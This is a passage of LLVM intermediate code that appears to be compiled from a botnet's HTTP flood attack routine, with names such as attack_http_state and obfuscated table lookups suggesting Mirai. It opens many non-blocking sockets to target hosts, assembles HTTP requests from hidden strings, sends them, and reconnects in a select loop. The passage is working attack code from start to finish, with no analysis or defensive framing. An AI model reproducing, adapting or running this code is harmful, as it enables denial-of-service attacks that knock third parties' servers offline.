; <label>:64:                                     ; preds = %.lr.ph656, %95
  %indvars.iv681 = phi i64 [ 0, %.lr.ph656 ], [ %indvars.iv.next682, %95 ]
  %65 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 1
  store i8 0, i8* %65, align 4
  %66 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 0
  store i32 -1, i32* %66, align 4
  %67 = trunc i64 %indvars.iv681 to i32
  %68 = srem i32 %67, %52
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 4
  store i32 %71, i32* %72, align 4
  %73 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 6, i64 0
  %74 = tail call i32 @util_strcpy(i8* %73, i8* %17) #9
  %75 = load i8, i8* %73, align 4
  %76 = icmp eq i8 %75, 47
  br i1 %76, label %81, label %77

; <label>:77:                                     ; preds = %64
  %78 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 6, i64 1
  %79 = tail call i32 @util_strlen(i8* %73) #9
  %80 = sext i32 %79 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %78, i8* %73, i64 %80, i32 1, i1 false)
  store i8 47, i8* %73, align 4
  br label %81

; <label>:81:                                     ; preds = %64, %77
  %82 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 10, i64 0
  %83 = tail call i32 @util_strcpy(i8* %82, i8* %15) #9
  %84 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 9, i64 0
  %85 = tail call i32 @util_strcpy(i8* %84, i8* %15) #9
  %86 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 7, i64 0
  %87 = tail call i32 @util_strcpy(i8* %86, i8* %16) #9
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 2
  %89 = load i8, i8* %88, align 4
  %90 = icmp ult i8 %89, 32
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %81
  %92 = load i32, i32* %70, align 4
  %93 = tail call i32 @ntohl(i32 %92) #10
  %94 = tail call i32 @htonl(i32 %93) #10
  store i32 %94, i32* %72, align 4
  br label %95

; <label>:95:                                     ; preds = %91, %81
  tail call void @table_unlock_val(i8 zeroext 47)
  %96 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 5, i64 0
  %97 = tail call i8* @table_retrieve_val(i32 47, i32* null)
  %98 = tail call i32 @util_strcpy(i8* %96, i8* %97) #9
  tail call void @table_lock_val(i8 zeroext 47)
  %99 = tail call i32 @util_strcpy(i8* %73, i8* %17) #9
  %indvars.iv.next682 = add nuw nsw i64 %indvars.iv681, 1
  %100 = icmp slt i64 %indvars.iv.next682, %48
  br i1 %100, label %64, label %.preheader615.loopexit

.backedge616.loopexit:                            ; preds = %.loopexit611
  br label %.backedge616.backedge

.backedge616:                                     ; preds = %.backedge616.backedge, %.preheader615
  %101 = call i64 @time(i64* null) #9
  %102 = trunc i64 %101 to i32
  %103 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %53) #9, !srcloc !1
  %104 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %54) #9, !srcloc !2
  br i1 %51, label %.lr.ph635.preheader, label %.backedge616.backedge

.lr.ph635.preheader:                              ; preds = %.backedge616
  br label %.lr.ph635

.lr.ph635:                                        ; preds = %.lr.ph635.preheader, %373
  %indvars.iv = phi i64 [ %indvars.iv.next, %373 ], [ 0, %.lr.ph635.preheader ]
  %.0550632 = phi i32 [ %.1551, %373 ], [ 0, %.lr.ph635.preheader ]
  %105 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv
  %106 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 1
  %107 = load i8, i8* %106, align 4
  %108 = icmp eq i8 %107, 1
  br i1 %108, label %109, label %113

; <label>:109:                                    ; preds = %.lr.ph635
  %110 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 12
  %111 = load i32, i32* %110, align 4
  %112 = icmp ne i32 %111, 0
  %.sink = select i1 %112, i8 4, i8 0
  store i8 %.sink, i8* %106, align 4
  br label %113

; <label>:113:                                    ; preds = %109, %.lr.ph635
  %114 = phi i8 [ %.sink, %109 ], [ %107, %.lr.ph635 ]
  switch i8 %114, label %369 [
    i8 0, label %115
    i8 2, label %147
    i8 4, label %169
    i8 6, label %330
    i8 7, label %343
    i8 10, label %356
  ]

; <label>:115:                                    ; preds = %113
  call void @llvm.memset.p0i8.i64(i8* nonnull %55, i8 0, i64 16, i32 4, i1 false)
  %116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %117 = load i32, i32* %116, align 4
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %121, label %119

; <label>:119:                                    ; preds = %115
  %120 = call i32 @close(i32 %117) #9
  br label %121

; <label>:121:                                    ; preds = %115, %119
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %122, i32* %116, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %373, label %124

; <label>:124:                                    ; preds = %121
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 3, i32 0) #9
  %126 = or i32 %125, 2048
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 4, i32 %126) #9
  store i32 65535, i32* %5, align 4
  %128 = load i32, i32* %116, align 4
  %129 = call i32 @setsockopt(i32 %128, i32 0, i32 8, i8* nonnull %56, i32 4) #9
  store i16 2, i16* %57, align 4
  %130 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 4
  %131 = load i32, i32* %130, align 4
  store i32 %131, i32* %58, align 4
  %132 = call zeroext i16 @htons(i16 zeroext %20) #10
  store i16 %132, i16* %59, align 2
  %133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  store i32 %102, i32* %133, align 4
  store i8 2, i8* %106, align 4
  %134 = load i32, i32* %116, align 4
  %135 = call i32 @connect(i32 %134, %struct.sockaddr* nonnull %60, i32 16) #9
  %136 = load i32, i32* %116, align 4
  %137 = srem i32 %136, 64
  %138 = zext i32 %137 to i64
  %139 = shl i64 1, %138
  %140 = sdiv i32 %136, 64
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %141
  %143 = load i64, i64* %142, align 8
  %144 = or i64 %139, %143
  store i64 %144, i64* %142, align 8
  %145 = icmp sgt i32 %136, %.0550632
  %146 = add nsw i32 %136, 1
  %..0550 = select i1 %145, i32 %146, i32 %.0550632
  br label %373

; <label>:147:                                    ; preds = %113
  %148 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  %149 = load i32, i32* %148, align 4
  %150 = sub i32 %102, %149
  %151 = icmp ugt i32 %150, 30
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %147
  store i8 0, i8* %106, align 4
  %153 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @close(i32 %154) #9
  store i32 -1, i32* %153, align 4
  br label %373

; <label>:156:                                    ; preds = %147
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %158 = load i32, i32* %157, align 4
  %159 = srem i32 %158, 64
  %160 = zext i32 %159 to i64
  %161 = shl i64 1, %160
  %162 = sdiv i32 %158, 64
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %163
  %165 = load i64, i64* %164, align 8
  %166 = or i64 %161, %165
  store i64 %166, i64* %164, align 8
  %167 = icmp sgt i32 %158, %.0550632
  %168 = add nsw i32 %158, 1
  %..0550570 = select i1 %167, i32 %168, i32 %.0550632
  br label %373

; <label>:169:                                    ; preds = %113
  %170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 14
  store i32 -1, i32* %170, align 4
  %171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 11
  store i32 0, i32* %171, align 4
  %172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %172, i32 1024) #9
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 17
  store i32 0, i32* %173, align 4
  call void @util_zero(i8* nonnull %61, i32 10240) #9
  %174 = call i32 @util_strlen(i8* nonnull %61) #9
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 9, i64 0
  %178 = call i32 @util_strcpy(i8* %176, i8* %177) #9
  %179 = call i32 @util_strlen(i8* nonnull %61) #9
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %180
  %182 = call i32 @util_strcpy(i8* %181, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #9
  %183 = call i32 @util_strlen(i8* nonnull %61) #9
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %184
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 6, i64 0
  %187 = call i32 @util_strcpy(i8* %185, i8* %186) #9
  %188 = call i32 @util_strlen(i8* nonnull %61) #9
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %189
  %191 = call i32 @util_strcpy(i8* %190, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0)) #9
  %192 = call i32 @util_strlen(i8* nonnull %61) #9
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %193
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 5, i64 0
  %196 = call i32 @util_strcpy(i8* %194, i8* %195) #9
  %197 = call i32 @util_strlen(i8* nonnull %61) #9
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %198
  %200 = call i32 @util_strcpy(i8* %199, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0)) #9
  %201 = call i32 @util_strlen(i8* nonnull %61) #9
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 7, i64 0
  %205 = call i32 @util_strcpy(i8* %203, i8* %204) #9
  %206 = call i32 @util_strlen(i8* nonnull %61) #9
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %207
  %209 = call i32 @util_strcpy(i8* %208, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  call void @table_unlock_val(i8 zeroext 32)
  %210 = call i32 @util_strlen(i8* nonnull %61) #9
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %211
  %213 = call i8* @table_retrieve_val(i32 32, i32* null)
  %214 = call i32 @util_strcpy(i8* %212, i8* %213) #9
  call void @table_lock_val(i8 zeroext 32)
  %215 = call i32 @util_strlen(i8* nonnull %61) #9
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %216
  %218 = call i32 @util_strcpy(i8* %217, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  call void @table_unlock_val(i8 zeroext 33)
  %219 = call i32 @util_strlen(i8* nonnull %61) #9
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %220
  %222 = call i8* @table_retrieve_val(i32 33, i32* null)
  %223 = call i32 @util_strcpy(i8* %221, i8* %222) #9
  call void @table_lock_val(i8 zeroext 33)
  %224 = call i32 @util_strlen(i8* nonnull %61) #9
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %225
  %227 = call i32 @util_strcpy(i8* %226, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  call void @table_unlock_val(i8 zeroext 34)
  %228 = call i32 @util_strlen(i8* nonnull %61) #9
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %229
  %231 = call i8* @table_retrieve_val(i32 34, i32* null)
  %232 = call i32 @util_strcpy(i8* %230, i8* %231) #9
  call void @table_lock_val(i8 zeroext 34)
  %233 = call i32 @util_strlen(i8* nonnull %61) #9
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %234
  %236 = call i32 @util_strcpy(i8* %235, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br i1 %62, label %237, label %265

; <label>:237:                                    ; preds = %169
  call void @table_unlock_val(i8 zeroext 35)
  %238 = call i32 @util_strlen(i8* nonnull %61) #9
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %239
  %241 = call i8* @table_retrieve_val(i32 35, i32* null)
  %242 = call i32 @util_strcpy(i8* %240, i8* %241) #9
  call void @table_lock_val(i8 zeroext 35)
  %243 = call i32 @util_strlen(i8* nonnull %61) #9
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %244
  %246 = call i32 @util_strcpy(i8* %245, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  %247 = call i32 @util_strlen(i8* nonnull %61) #9
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %248
  %250 = call i8* @table_retrieve_val(i32 40, i32* null)
  %251 = call i32 @util_strcpy(i8* %249, i8* %250) #9
  %252 = call i32 @util_strlen(i8* nonnull %61) #9
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %253
  %255 = call i32 @util_strcpy(i8* %254, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #9
  %256 = call i32 @util_strlen(i8* nonnull %14) #9
  %257 = call i32 @util_strlen(i8* nonnull %61) #9
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %258
  %260 = call i8* @util_itoa(i32 %256, i32 10, i8* %259) #9
  %261 = call i32 @util_strlen(i8* nonnull %61) #9
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %262
  %264 = call i32 @util_strcpy(i8* %263, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br label %265

; <label>:265:                                    ; preds = %237, %169
  %266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 15
  %267 = load i32, i32* %266, align 4
  %268 = icmp sgt i32 %267, 0
  br i1 %268, label %269, label %296

; <label>:269:                                    ; preds = %265
  %270 = call i32 @util_strlen(i8* nonnull %61) #9
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %271
  %273 = call i32 @util_strcpy(i8* %272, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0)) #9
  store i32 0, i32* %5, align 4
  %274 = load i32, i32* %266, align 4
  %275 = icmp sgt i32 %274, 0
  %276 = call i32 @util_strlen(i8* nonnull %61) #9
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %277
  br i1 %275, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %269
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %279 = phi i8* [ %294, %.lr.ph ], [ %278, %.lr.ph.preheader ]
  %280 = load i32, i32* %5, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 16, i64 %281, i64 0
  %283 = call i32 @util_strcpy(i8* %279, i8* %282) #9
  %284 = call i32 @util_strlen(i8* nonnull %61) #9
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %285
  %287 = call i32 @util_strcpy(i8* %286, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0)) #9
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = load i32, i32* %266, align 4
  %291 = icmp slt i32 %289, %290
  %292 = call i32 @util_strlen(i8* nonnull %61) #9
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %293
  br i1 %291, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %269
  %.lcssa = phi i8* [ %278, %269 ], [ %294, %._crit_edge.loopexit ]
  %295 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br label %296

; <label>:296:                                    ; preds = %._crit_edge, %265
  %297 = call i32 @util_strlen(i8* nonnull %61) #9
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %298
  %300 = call i32 @util_strcpy(i8* %299, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br i1 %62, label %301, label %306

; <label>:301:                                    ; preds = %296
  %302 = call i32 @util_strlen(i8* nonnull %61) #9
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %303
  %305 = call i32 @util_strcpy(i8* %304, i8* nonnull %14) #9
  br label %306

; <label>:306:                                    ; preds = %301, %296
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 10, i64 0
  %308 = call signext i8 @util_strcmp(i8* nonnull %177, i8* %307) #9
  %309 = icmp eq i8 %308, 0
  br i1 %309, label %310, label %312

; <label>:310:                                    ; preds = %306
  %311 = call i32 @util_strcpy(i8* nonnull %177, i8* %307) #9
  br label %312

; <label>:312:                                    ; preds = %306, %310
  %313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %314 = load i32, i32* %313, align 4
  %315 = call i32 @util_strlen(i8* nonnull %61) #9
  %316 = sext i32 %315 to i64
  %317 = call i64 @send(i32 %314, i8* nonnull %61, i64 %316, i32 16384) #9
  %318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 3
  store i32 %102, i32* %318, align 4
  store i8 6, i8* %106, align 4
  %319 = load i32, i32* %313, align 4
  %320 = srem i32 %319, 64
  %321 = zext i32 %320 to i64
  %322 = shl i64 1, %321
  %323 = sdiv i32 %319, 64
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %324
  %326 = load i64, i64* %325, align 8
  %327 = or i64 %322, %326
  store i64 %327, i64* %325, align 8
  %328 = icmp sgt i32 %319, %.0550632
  %329 = add nsw i32 %319, 1
  %..0550571 = select i1 %328, i32 %329, i32 %.0550632
  br label %373

; <label>:330:                                    ; preds = %113
  %331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %332 = load i32, i32* %331, align 4
  %333 = srem i32 %332, 64
  %334 = zext i32 %333 to i64
  %335 = shl i64 1, %334
  %336 = sdiv i32 %332, 64
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %337
  %339 = load i64, i64* %338, align 8
  %340 = or i64 %335, %339
  store i64 %340, i64* %338, align 8
  %341 = icmp sgt i32 %332, %.0550632
  %342 = add nsw i32 %332, 1
  %..0550572 = select i1 %341, i32 %342, i32 %.0550632
  br label %373

; <label>:343:                                    ; preds = %113
  %344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %345 = load i32, i32* %344, align 4
  %346 = srem i32 %345, 64
  %347 = zext i32 %346 to i64
  %348 = shl i64 1, %347
  %349 = sdiv i32 %345, 64
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %350
  %352 = load i64, i64* %351, align 8
  %353 = or i64 %348, %352
  store i64 %353, i64* %351, align 8
  %354 = icmp sgt i32 %345, %.0550632
  %355 = add nsw i32 %345, 1
  %..0550573 = select i1 %354, i32 %355, i32 %.0550632
  br label %373

; <label>:356:                                    ; preds = %113
  %357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %358 = load i32, i32* %357, align 4
  %359 = srem i32 %358, 64
  %360 = zext i32 %359 to i64
  %361 = shl i64 1, %360
  %362 = sdiv i32 %358, 64
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %363
  %365 = load i64, i64* %364, align 8
  %366 = or i64 %361, %365
  store i64 %366, i64* %364, align 8
  %367 = icmp sgt i32 %358, %.0550632
  %368 = add nsw i32 %358, 1
  %..0550574 = select i1 %367, i32 %368, i32 %.0550632
  br label %373

; <label>:369:                                    ; preds = %113
  store i8 0, i8* %106, align 4
  %370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %371 = load i32, i32* %370, align 4
  %372 = call i32 @close(i32 %371) #9
  store i32 -1, i32* %370, align 4
  br label %373

; <label>:373:                                    ; preds = %356, %343, %330, %312, %156, %124, %369, %121, %152
  %.1551 = phi i32 [ %.0550632, %121 ], [ %.0550632, %152 ], [ %.0550632, %369 ], [ %..0550, %124 ], [ %..0550570, %156 ], [ %..0550571, %312 ], [ %..0550572, %330 ], [ %..0550573, %343 ], [ %..0550574, %356 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %374 = icmp slt i64 %indvars.iv.next, %48
  br i1 %374, label %.lr.ph635, label %._crit_edge636

._crit_edge636:                                   ; preds = %373
  %375 = icmp eq i32 %.1551, 0
  br i1 %375, label %.backedge616.backedge, label %376

.backedge616.backedge:                            ; preds = %._crit_edge636, %376, %.backedge616, %.backedge616.loopexit
  br label %.backedge616

; <label>:376:                                    ; preds = %._crit_edge636
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %9, align 16
  %377 = call i32 @select(i32 %.1551, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #9
  %378 = call i64 @time(i64* null) #9
  %379 = trunc i64 %378 to i32
  %380 = icmp slt i32 %377, 1
  %brmerge = or i1 %380, %.not
  br i1 %brmerge, label %.backedge616.backedge, label %.lr.ph653.preheader

.lr.ph653.preheader:                              ; preds = %376
  br label %.lr.ph653

.lr.ph653:                                        ; preds = %.lr.ph653.preheader, %.loopexit611
  %indvars.iv679 = phi i64 [ %indvars.iv.next680, %.loopexit611 ], [ 0, %.lr.ph653.preheader ]
  %381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 0
  %382 = load i32, i32* %381, align 4
  %383 = icmp eq i32 %382, -1
  br i1 %383, label %.loopexit611, label %384

; <label>:384:                                    ; preds = %.lr.ph653
  %385 = sdiv i32 %382, 64
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %386
  %388 = load i64, i64* %387, align 8
  %389 = srem i32 %382, 64
  %390 = zext i32 %389 to i64
  %391 = shl i64 1, %390
  %392 = and i64 %388, %391
  %393 = icmp eq i64 %392, 0
  br i1 %393, label %405, label %394

; <label>:394:                                    ; preds = %384
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %395 = call i32 @getsockopt(i32 %382, i32 1, i32 4, i8* nonnull %63, i32* nonnull %13) #9
  %396 = load i32, i32* %12, align 4
  %397 = or i32 %396, %395
  %398 = icmp eq i32 %397, 0
  br i1 %398, label %399, label %401

; <label>:399:                                    ; preds = %394
  %400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 1
  store i8 4, i8* %400, align 4
  %.pre683 = load i32, i32* %381, align 4
  br label %405

; <label>:401:                                    ; preds = %394
  %402 = load i32, i32* %381, align 4
  %403 = call i32 @close(i32 %402) #9
  store i32 -1, i32* %381, align 4
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 1
  store i8 0, i8* %404, align 4
  br label %.loopexit611

; <label>:405:                                    ; preds = %384, %399
  %406 = phi i32 [ %382, %384 ], [ %.pre683, %399 ]
  %407 = sdiv i32 %406, 64
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %408
  %410 = load i64, i64* %409, align 8
  %411 = srem i32 %406, 64
  %412 = zext i32 %411 to i64
  %413 = shl i64 1, %412
  %414 = and i64 %413, %410
  %415 = icmp eq i64 %414, 0
  br i1 %415, label %.loopexit611, label %416

; <label>:416:                                    ; preds = %405
  %417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 1
  %418 = load i8, i8* %417, align 4
  switch i8 %418, label %.loopexit611 [
    i8 6, label %427
    i8 7, label %.preheader610
    i8 10, label %.preheader612.preheader
  ]

.preheader612.preheader:                          ; preds = %416
  br label %.preheader612

.preheader610:                                    ; preds = %416
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 17
  %420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 0
  %421 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 64
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 2
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 14
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 11
  %425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 13
  %426 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 15
  br label %878

; <label>:427:                                    ; preds = %416
  call void @util_zero(i8* nonnull %21, i32 10240) #9
  %428 = load i32, i32* %381, align 4
  %429 = call i64 @recv(i32 %428, i8* nonnull %21, i64 10240, i32 16386) #9
  %430 = trunc i64 %429 to i32
  %431 = icmp slt i32 %430, 1
  br i1 %431, label %432, label %435

; <label>:432:                                    ; preds = %427
  %433 = load i32, i32* %381, align 4
  %434 = call i32 @close(i32 %433) #9
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit611

; <label>:435:                                    ; preds = %427
  %436 = call i32 @util_memsearch(i8* nonnull %21, i32 %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %437 = icmp eq i32 %436, -1
  %438 = icmp slt i32 %430, 10240
  %or.cond5 = and i1 %438, %437
  br i1 %or.cond5, label %.loopexit611, label %439

; <label>:439:                                    ; preds = %435
  %440 = sext i32 %436 to i64
  %441 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %440
  store i8 0, i8* %441, align 1
  %442 = call i8* @table_retrieve_val(i32 46, i32* null)
  %443 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %442) #9
  %444 = icmp eq i32 %443, -1
  br i1 %444, label %447, label %445

; <label>:445:                                    ; preds = %439
